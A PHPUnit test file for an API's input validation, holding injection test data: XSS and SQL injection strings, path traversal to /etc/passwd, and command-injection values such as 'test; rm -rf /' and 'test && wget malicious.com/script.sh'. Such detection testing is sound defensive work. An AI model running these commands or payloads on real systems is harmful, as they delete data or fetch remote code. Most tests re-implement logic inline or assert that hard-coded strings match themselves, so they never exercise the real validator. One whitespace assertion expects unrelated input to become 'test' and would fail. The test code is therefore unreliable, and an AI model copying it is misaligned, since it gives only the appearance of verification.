<?php
/**
 * Unit Tests for Input Validation
 * Tests the validation utility functions and InputValidator class
 * 
 * Test Coverage:
 * - Data type validation (ID, date, time, username)
 * - JSON input validation and sanitization
 * - Required vs optional field handling
 * - Security validation (XSS, SQL injection prevention)
 * - Error handling and exception throwing
 */

use PHPUnit\Framework\TestCase;

class ValidationTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        
        if (!defined('API_GUARD')) {
            define('API_GUARD', true);
        }
        
        if (!defined('TEST_MODE')) {
            define('TEST_MODE', true);
        }
        
        // Clear input data
        $_POST = [];
        $_GET = [];
        file_put_contents('php://input', '');
    }

    /**
     * Test ID validation
     */
    public function testIdValidation(): void
    {
        // Load validation code to test patterns
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that ID validation exists
        $this->assertStringContainsString('isValidId', $validationCode, 'Should have ID validation function');
        
        // Simulate ID validation logic
        $validIds = [1, 42, 999999];
        $invalidIds = [0, -1, 'abc', null, '', '1; DROP TABLE users;'];
        
        foreach ($validIds as $id) {
            $isValid = is_numeric($id) && (int)$id > 0 && $id == (int)$id;
            $this->assertTrue($isValid, "ID $id should be valid");
        }
        
        foreach ($invalidIds as $id) {
            $isValid = is_numeric($id) && (int)$id > 0 && $id == (int)$id;
            $this->assertFalse($isValid, "ID " . var_export($id, true) . " should be invalid");
        }
    }

    /**
     * Test date validation (YYYY-MM-DD format)
     */
    public function testDateValidation(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that date validation exists
        $this->assertStringContainsString('isValidDate', $validationCode, 'Should have date validation function');
        
        // Test valid dates
        $validDates = ['2025-08-06', '2024-12-31', '2023-01-01'];
        $invalidDates = [
            '25-08-06',     // Wrong format
            '2025/08/06',   // Wrong separator
            '2025-13-01',   // Invalid month
            '2025-12-32',   // Invalid day
            '2025-2-1',     // Single digits
            '',             // Empty
            'invalid-date'  // Non-date string
        ];
        
        foreach ($validDates as $date) {
            $isValid = preg_match('/^\d{4}-\d{2}-\d{2}$/', $date) && 
                       strtotime($date) !== false;
            $this->assertTrue($isValid, "Date $date should be valid");
        }
        
        foreach ($invalidDates as $date) {
            $isValid = preg_match('/^\d{4}-\d{2}-\d{2}$/', $date) && 
                       strtotime($date) !== false;
            $this->assertFalse($isValid, "Date $date should be invalid");
        }
    }

    /**
     * Test time validation (HH:MM:SS format)
     */
    public function testTimeValidation(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that time validation exists
        $this->assertStringContainsString('isValidTime', $validationCode, 'Should have time validation function');
        
        // Test valid times
        $validTimes = ['09:00:00', '23:59:59', '00:00:00', '12:30:45'];
        $invalidTimes = [
            '9:00:00',      // Single digit hour
            '09:0:00',      // Single digit minute
            '09:00:0',      // Single digit second
            '25:00:00',     // Invalid hour
            '09:60:00',     // Invalid minute
            '09:00:60',     // Invalid second
            '09:00',        // Missing seconds
            '',             // Empty
            'invalid-time'  // Non-time string
        ];
        
        foreach ($validTimes as $time) {
            $isValid = preg_match('/^\d{2}:\d{2}:\d{2}$/', $time);
            if ($isValid) {
                list($hour, $minute, $second) = explode(':', $time);
                $isValid = ($hour >= 0 && $hour <= 23) && 
                          ($minute >= 0 && $minute <= 59) && 
                          ($second >= 0 && $second <= 59);
            }
            $this->assertTrue($isValid, "Time $time should be valid");
        }
        
        foreach ($invalidTimes as $time) {
            $isValid = preg_match('/^\d{2}:\d{2}:\d{2}$/', $time);
            if ($isValid && !empty($time)) {
                list($hour, $minute, $second) = explode(':', $time);
                $isValid = ($hour >= 0 && $hour <= 23) && 
                          ($minute >= 0 && $minute <= 59) && 
                          ($second >= 0 && $second <= 59);
            } else {
                $isValid = false;
            }
            $this->assertFalse($isValid, "Time $time should be invalid");
        }
    }

    /**
     * Test username validation
     */
    public function testUsernameValidation(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that username validation might be disabled for Azure AD
        $this->assertStringContainsString('Azure AD names have spaces', $validationCode, 
            'Should document Azure AD username handling');
        
        // Test traditional username patterns (if enabled)
        $validUsernames = ['user123', 'test.user', 'john_doe'];
        $invalidUsernames = ['', 'a', 'user with spaces', 'user@domain', '<script>'];
        
        // Since Azure AD allows spaces, traditional validation might be relaxed
        foreach ($validUsernames as $username) {
            $isValid = !empty($username) && strlen($username) >= 2;
            $this->assertTrue($isValid, "Username $username should be valid");
        }
        
        // Test for security issues
        $maliciousUsernames = ['<script>alert("xss")</script>', "'; DROP TABLE users; --"];
        foreach ($maliciousUsernames as $username) {
            $containsScript = strpos($username, '<script>') !== false;
            $containsSql = strpos($username, 'DROP TABLE') !== false;
            $this->assertTrue($containsScript || $containsSql, "Should detect malicious content in $username");
        }
    }

    /**
     * Test JSON input validation
     */
    public function testJsonInputValidation(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that JSON validation exists
        $this->assertStringContainsString('validateJsonInput', $validationCode, 
            'Should have JSON input validation function');
        $this->assertStringContainsString('InvalidArgumentException', $validationCode, 
            'Should throw InvalidArgumentException for validation errors');
        
        // Test valid JSON input simulation
        $validJsonData = [
            'userId' => 1,
            'username' => 'test.user',
            'date' => '2025-08-06',
            'startTime' => '09:00:00',
            'location' => 'Office'
        ];
        
        $requiredFields = ['userId', 'username', 'date', 'startTime', 'location'];
        $optionalFields = ['stopTime' => null];
        
        // Simulate validation logic
        foreach ($requiredFields as $field) {
            $this->assertArrayHasKey($field, $validJsonData, "Required field $field should be present");
            $this->assertNotEmpty($validJsonData[$field], "Required field $field should not be empty");
        }
        
        // Test missing required field
        $incompleteData = $validJsonData;
        unset($incompleteData['username']);
        
        $isMissingRequired = false;
        foreach ($requiredFields as $field) {
            if (!isset($incompleteData[$field]) || empty($incompleteData[$field])) {
                $isMissingRequired = true;
                break;
            }
        }
        $this->assertTrue($isMissingRequired, 'Should detect missing required fields');
    }

    /**
     * Test input sanitization
     */
    public function testInputSanitization(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test that sanitization methods exist or are referenced
        $sanitizationMethods = ['trim', 'strip_tags', 'htmlspecialchars'];
        foreach ($sanitizationMethods as $method) {
            // Note: May not be explicitly in validation.php but should be used
            $this->assertTrue(function_exists($method), "Sanitization function $method should exist");
        }
        
        // Test XSS prevention
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert(1)',
            '<svg onload="alert(1)">'
        ];
        
        foreach ($maliciousInputs as $input) {
            $sanitized = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
            $this->assertNotEquals($input, $sanitized, 'Should sanitize malicious input');
            $this->assertStringNotContainsString('<script>', $sanitized, 'Should escape script tags');
        }
        
        // Test SQL injection patterns
        $sqlInjectionInputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --"
        ];
        
        foreach ($sqlInjectionInputs as $input) {
            // Proper validation should reject these patterns
            $containsDrop = stripos($input, 'DROP') !== false;
            $containsDelete = stripos($input, 'DELETE') !== false;
            $containsOr = stripos($input, "OR '1'='1") !== false;
            
            $isSqlInjection = $containsDrop || $containsDelete || $containsOr;
            $this->assertTrue($isSqlInjection, "Should detect SQL injection pattern in: $input");
        }
    }

    /**
     * Test error handling and exceptions
     */
    public function testErrorHandlingAndExceptions(): void
    {
        $validationCode = file_get_contents(API_BASE_PATH . '/validation.php');
        
        // Test exception types
        $this->assertStringContainsString('InvalidArgumentException', $validationCode, 
            'Should use InvalidArgumentException for validation errors');
        
        // Test error messages
        $this->assertStringContainsString('message', $validationCode, 
            'Should provide error messages');
        
        // Simulate exception throwing
        $testExceptions = [
            'Missing required field: userId',
            'Invalid date format. Expected YYYY-MM-DD',
            'Invalid time format. Expected HH:MM:SS',
            'Invalid userId format'
        ];
        
        foreach ($testExceptions as $message) {
            try {
                throw new InvalidArgumentException($message);
                $this->fail('Exception should have been thrown');
            } catch (InvalidArgumentException $e) {
                $this->assertEquals($message, $e->getMessage(), 'Exception message should match');
            }
        }
    }

    /**
     * Test validation performance
     */
    public function testValidationPerformance(): void
    {
        $startTime = microtime(true);
        
        // Simulate validation of 1000 records
        for ($i = 0; $i < 1000; $i++) {
            $data = [
                'userId' => $i + 1,
                'date' => '2025-08-06',
                'startTime' => '09:00:00',
                'stopTime' => '17:00:00'
            ];
            
            // Simulate validation checks
            $isValidId = is_numeric($data['userId']) && $data['userId'] > 0;
            $isValidDate = preg_match('/^\d{4}-\d{2}-\d{2}$/', $data['date']);
            $isValidStartTime = preg_match('/^\d{2}:\d{2}:\d{2}$/', $data['startTime']);
            $isValidStopTime = preg_match('/^\d{2}:\d{2}:\d{2}$/', $data['stopTime']);
            
            $this->assertTrue($isValidId, 'ID validation should pass');
            $this->assertTrue($isValidDate, 'Date validation should pass');
            $this->assertTrue($isValidStartTime, 'Start time validation should pass');
            $this->assertTrue($isValidStopTime, 'Stop time validation should pass');
        }
        
        $endTime = microtime(true);
        $executionTime = $endTime - $startTime;
        
        // Should validate 1000 records quickly
        $this->assertLessThan(0.1, $executionTime, 'Validation should be fast');
    }

    /**
     * Test security validation patterns
     */
    public function testSecurityValidationPatterns(): void
    {
        // Test path traversal prevention
        $pathTraversalInputs = ['../../../etc/passwd', '..\\windows\\system32', '../config.php'];
        foreach ($pathTraversalInputs as $input) {
            $containsTraversal = strpos($input, '..') !== false;
            $this->assertTrue($containsTraversal, "Should detect path traversal in: $input");
        }
        
        // Test null byte injection
        $nullByteInputs = ["test\0.txt", "file.php\0.jpg"];
        foreach ($nullByteInputs as $input) {
            $containsNullByte = strpos($input, "\0") !== false;
            $this->assertTrue($containsNullByte, "Should detect null byte injection in: $input");
        }
        
        // Test command injection
        $commandInjectionInputs = ['test; rm -rf /', 'test | cat /etc/passwd', 'test && wget malicious.com/script.sh'];
        foreach ($commandInjectionInputs as $input) {
            $containsCommand = preg_match('/[;&|`]/', $input);
            $this->assertTrue($containsCommand, "Should detect command injection pattern in: $input");
        }
        
        // Test length validation
        $maxLength = 255;
        $tooLongInput = str_repeat('a', $maxLength + 1);
        $validLengthInput = str_repeat('a', $maxLength);
        
        $this->assertGreaterThan($maxLength, strlen($tooLongInput), 'Should detect overly long input');
        $this->assertLessThanOrEqual($maxLength, strlen($validLengthInput), 'Should accept valid length input');
    }

    /**
     * Test data type coercion and normalization
     */
    public function testDataTypeCoercionAndNormalization(): void
    {
        // Test integer coercion
        $integerInputs = ['123', 123, '0', 0];
        foreach ($integerInputs as $input) {
            $coerced = (int)$input;
            $this->assertIsInt($coerced, 'Should coerce to integer');
        }
        
        // Test string normalization
        $stringInputs = [' test ', "\ttest\n", '  multiple  spaces  '];
        foreach ($stringInputs as $input) {
            $normalized = trim(preg_replace('/\s+/', ' ', $input));
            $this->assertStringNotContainsString("\n", $normalized, 'Should remove newlines');
            $this->assertStringNotContainsString("\t", $normalized, 'Should remove tabs');
            $this->assertEquals('test', trim($normalized, ' '), 'Should normalize whitespace');
        }
        
        // Test boolean normalization
        $booleanInputs = [
            ['true', true],
            ['false', false],
            ['1', true],
            ['0', false],
            [1, true],
            [0, false]
        ];
        
        foreach ($booleanInputs as [$input, $expected]) {
            $normalized = filter_var($input, FILTER_VALIDATE_BOOLEAN);
            $this->assertEquals($expected, $normalized, "Should normalize boolean: $input");
        }
    }
}